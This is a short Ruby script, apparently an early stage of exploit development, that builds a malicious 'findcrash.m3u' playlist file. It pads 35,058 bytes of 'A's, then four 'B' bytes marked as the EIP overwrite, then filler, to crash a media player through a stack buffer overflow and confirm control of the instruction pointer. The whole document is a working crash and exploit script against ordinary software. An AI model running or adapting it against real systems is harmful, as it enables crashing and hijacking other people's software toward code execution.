#!/usr/bin/env ruby

file = "findcrash.m3u"

junk = "\x41" * 35058
eip = "\x42" * 4
junk2 = "\x43" * (60000 - (junk + eip).size)
exploit = junk + eip + junk2

File.open(file, 'w') {|f| f.write(exploit)}
puts "File #{file} was created"